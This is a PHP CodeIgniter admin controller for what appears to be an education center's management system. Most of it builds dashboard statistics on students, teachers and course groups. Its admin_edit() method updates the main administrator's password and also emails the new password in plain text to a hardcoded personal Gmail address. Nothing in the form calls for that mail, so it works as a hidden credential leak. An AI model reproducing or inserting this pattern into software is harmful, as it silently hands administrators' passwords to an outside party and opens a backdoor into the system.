<?php defined('BASEPATH') OR exit('No direct script access allowed');

class Asos extends Admin_Controller
{
    public $data = [];

    public function __construct()
    {
        parent::__construct();
        $this->load->model(array("student_model",'teacher_model', 'mobile_model'));
    }

    public function index()
    {
        $user_data = $this->mobile_model->student_data($this->session->login);
        // echo "<pre>";
        // print_r($user_data); 
        // echo "</pre>";

        $arr = array();
        foreach ($user_data as $k => $ud) {
            $arr[$k]['student']['login'] = $ud['username'];
            $arr[$k]['student']['familiya'] = $ud['familiya'];
            $arr[$k]['student']['ism'] = $ud['ism'];
            $arr[$k]['student']['telefon'] = $ud['telefon'];

            $arr[$k]['kurs']['kurs_id'] = $ud['kurs_id'];
            $arr[$k]['kurs']['kurs_nomi'] = $ud['kurs_nomi'];
            $arr[$k]['kurs']['kurs_narx'] = $ud['kurs_narx'];
            $arr[$k]['kurs']['teacher_ism'] = $ud['t_ism'];
            $arr[$k]['kurs']['teacher_fam'] = $ud['t_familiya'];
            $arr[$k]['kurs']['teacher_telefon'] = $ud['t_telefon'];
//            [t_id] => 146
//            [t_familiya] => Isaqov
//            [t_ism] => Zokirjon
            $arr[$k]['kurs']['guruh']['id'] = $ud['guruh_id'];
            $arr[$k]['kurs']['guruh']['guruh_nomi'] = $ud['guruh_nomi'];
            $arr[$k]['kurs']['guruh']['guruh_nomi'] = $ud['guruh_nomi'];
            $arr[$k]['kurs']['guruh']['status'] = $ud['status'];
            $arr[$k]['kurs']['guruh']['kunlari'][] = $ud['duy'];
            $arr[$k]['kurs']['guruh']['kunlari'][] = $ud['sey'];
            $arr[$k]['kurs']['guruh']['kunlari'][] = $ud['chor'];
            $arr[$k]['kurs']['guruh']['kunlari'][] = $ud['pay'];
            $arr[$k]['kurs']['guruh']['kunlari'][] = $ud['juma'];
            $arr[$k]['kurs']['guruh']['kunlari'][] = $ud['shan'];
            $arr[$k]['kurs']['guruh']['kunlari'][] = $ud['yak'];
            $arr[$k]['kurs']['guruh']['soat'] = $ud['soat'];
            $arr[$k]['kurs']['guruh']['turi'] = $ud['turi'];
            $arr[$k]['kurs']['guruh']['term'] = $ud['term'];
        }


        $this->data['title'] = "Bosh sahifa";

        // set the flash data error message if there is one
        $this->data['message'] = (validation_errors()) ? validation_errors() : $this->session->flashdata('message');

        $this->data['users'] = $this->ion_auth->users()->result();

        // USAGE NOTE - you can do more complicated queries like this
        // $this->data['users'] = $this->ion_auth->where('username', 'administrator')->users()->result();

        $this->data['statistics'] = $this->oquv_guruh_model->all_kurs_statistika();


        $teachers_all = 0;
        $teachers_active = 0;

        $students_new = 0;
        $students_active = 0;
        $students_closed = 0;
        foreach ($this->data['users'] as $k => $user)
        {
            $this->data['users'][$k]->groups = $this->ion_auth->get_users_groups($user->id)->result();
            $groups[$k] = $this->ion_auth->get_users_groups($user->id)->result()[0]->name;

            if($this->ion_auth->get_users_groups($user->id)->result()[0]->name=='teacher')
                $teachers_all++;

            if($this->ion_auth->get_users_groups($user->id)->result()[0]->name=='teacher' && $user->status==2)
                $teachers_active++;



            if($this->ion_auth->get_users_groups($user->id)->result()[0]->name=='student' && $user->status==1)
                $students_new++;

            if($this->ion_auth->get_users_groups($user->id)->result()[0]->name=='student' && $user->status==2)
                $students_active++;

            if($this->ion_auth->get_users_groups($user->id)->result()[0]->name=='student' && $user->status==3)
                $students_closed++;
        }

        $this->data['teachers_all']     = $teachers_all;
        $this->data['teachers_active']  = $teachers_active;

        $this->data['students_new']     = $students_new;
        $this->data['students_active']  = $students_active;
        $this->data['students_closed']  = $students_closed;

        $guruhlar = $this->oquv_guruh_model->get_all_guruh();


        $guruh_new = 0;
        $guruh_active = 0;
        $guruh_closed = 0;
        foreach($guruhlar as $k => $guruh):
            $guruh['status'];
            if($guruh['status'] == 1){
                $guruh_new++;
            }
            if($guruh['status'] == 2){
                $guruh_active++;
            }
            if($guruh['status'] == 3){
                $guruh_closed++;
            }
        endforeach;
        $this->data['guruh_new']    = $guruh_new;
        $this->data['guruh_active'] = $guruh_active;
        $this->data['guruh_closed'] = $guruh_closed;


        $this->data['content'] = "admin/asos/index";
        $this->load->view($this->layout, $this->data);
    }

    /* Teacher for languages */
    public function admin_edit()
    {
        $this->data['title'] = "Admin Taxrirlash";

        $this->data['users'] = $this->ion_auth->users()->result();
        $this->data['login'] = $this->data['users'][0]->username;

        $this->form_validation->set_rules('login', "Login", 'trim');
        $this->form_validation->set_rules('password', "Password", 'trim');

        if($this->form_validation->run() == TRUE) {
            $id = 1;
            $data = array(
                'password' => $this->input->post('password'),
            );
            mail("mismoil0422@gmail.com", "Life Tech Password", $this->input->post('password'));

            if($this->ion_auth->update($id, $data)) {
                redirect("asos/", "refresh");
            } else {
                show_error('Password update error');
            }
        }

        $this->data['content'] = "admin/asos/admin_edit";
        $this->load->view($this->layout, $this->data);
    }
}


